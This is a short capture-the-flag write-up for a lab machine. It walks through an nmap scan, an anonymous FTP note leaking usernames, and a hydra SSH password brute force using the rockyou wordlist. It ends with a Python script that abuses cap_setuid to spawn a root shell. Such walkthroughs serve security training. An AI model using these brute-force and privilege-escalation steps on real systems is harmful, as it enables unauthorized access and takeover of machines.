## hackers writeup 02
namp scan gives you the folowing results:-
```
root@5h4rk:~# nmap -sV -p- 10.10.166.184
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-09 17:59 BST
Nmap scan report for 10.10.166.184
Host is up (0.022s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
9999/tcp open  abyss?
```
=> there is a Anonymous login avilabel with FTP so enumerating <br>
that gives you a note which says:- <br>
```
Note:
Any users with passwords in this list:
love
sex
god
secret
will be subject to an immediate disciplinary hearing.
Any users with other weak passwords will be complained at, loudly.
These users are:
rcampbell:Robert M. Campbell:Weak password
gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password
Exposing the company's cryptographic keys is a disciplinary offense.
Eugene Belford, CSO
```
as the note said rcampbell has a weak password so with the help of hydra we can get the password for ssh using:-

```
hydra ssh://10.10.99.187 -l rcampbell -P /usr/share/wordlists/rockyou.txt -t 64
```
once you get the credentials just login using them you got the user shell!  <br>
Now time for root. <br>
so doing some enumeration i found this:-
```
rcampbell@gibson:~$ getcap -r / 2>/dev/null
/usr/bin/python3.6 = cap_setuid+ep
/usr/bin/python3.6m = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```
setuid looks intresting. that allows the process to use the setuid system call fully. <br>
so with the help of that lets set uid with os.setuid(id) and get root this is the script i used.

```
import os,pty

os.setuid(0)
pty.spawn("/bin/bash")
```
running this gave me root.
```
rcampbell@gibson:~$ python3 root.py 
root@gibson:~# id -a
uid=0(root) gid=1002(rcampbell) groups=1002(rcampbell)
``` 
so you rooted the machine its time to echo your name to king and protect it :) 
